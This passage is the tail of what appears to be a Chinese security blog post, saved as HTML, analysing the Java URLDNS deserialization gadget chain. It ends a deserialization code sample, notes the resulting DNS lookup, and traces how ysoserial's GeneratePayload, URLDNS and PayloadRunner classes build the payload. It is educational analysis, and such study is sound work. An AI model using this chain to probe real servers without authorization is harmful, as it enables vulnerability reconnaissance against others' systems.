class="line">        oosin.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>执行之后，最近收到了DNS解析的请求</p>
+<p><img src="HmrnyhMcIQ1bLzcTSivhn_32R4ZDJTHc4Utx7382gQw.png" alt="image"></p>
+<h2 id="Ysoserial-URLDNS"><a href="#Ysoserial-URLDNS" class="headerlink" title="Ysoserial.URLDNS"></a>Ysoserial.URLDNS</h2><p>先是在主类GeneratePayload；获取指定的根据命令行参数获取 payload 的类型和要执行的命令。使用 Utils.getPayloadClass(payloadType) 方法获取与 payload 类型对应的 payload 类</p>
+<p><img src="Aqh2cx7izJhK6UWx_xXMwx7MPTLd-3yE6gnAcql688U.png" alt="image"></p>
+<p>我们来看到URLDNS类；实现了 ObjectPayload 接口的 URLDNS 类，用于生成一个包含指定 URL 的 HashMap 对象作为 payload</p>
+<p><img src="P4YoVmv1GIhgr2PHyQaAPvdC0Wp3U6ogx0UvAteXQF4.png" alt="image"></p>
+<p>然后调用PayloadRunner.run；在PayloadRunner.run可以进行序列化，序列化好的结果则为payload</p>
+<p><img src="zSy25BKJKMGCQn_YD6xgkiaeaajw8gdhJPdAa07JemM.png" alt="image"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nMkV__cVYarjnTYsNPKMGg">https://mp.weixin.qq.com/s/nMkV__cVYarjnTYsNPKMGg</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/449/">http://blog.m1kael.cn/index.php/archives/449/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Java安全之URLDNS链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">Java反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">1.3.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ysoserial-URLDNS"><span class="toc-number">1.4.</span> <span class="toc-text">Ysoserial.URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&text=Java安全之URLDNS链分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Java安全之URLDNS链分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全之URLDNS链分析&body=Check out this article: https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&name=Java安全之URLDNS链分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&t=Java安全之URLDNS链分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
